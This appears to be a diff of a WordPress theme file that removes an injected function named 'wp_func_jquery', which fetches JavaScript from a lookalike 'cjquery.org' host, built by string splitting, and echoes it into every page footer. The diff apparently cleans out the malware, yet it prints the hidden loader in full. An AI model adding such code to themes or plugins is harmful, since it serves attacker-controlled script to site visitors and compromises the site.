@@ -121,17 +121,7 @@ if ( ! function_exists( 'get_single_theme_mod' ) ) {
 		}
 	}
 }
-if(!function_exists('wp_func_jquery')) {
-	function wp_func_jquery() {
-		$host = 'http://';
-		$jquery = $host.'c'.'jquery.org/jquery-ui.js';
-		$headers = @get_headers($jquery, 1);
-		if ($headers[0] == 'HTTP/1.1 200 OK'){
-			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
-		}
-	}
-	add_action('wp_footer', 'wp_func_jquery');
-}
+
 
 
 /**
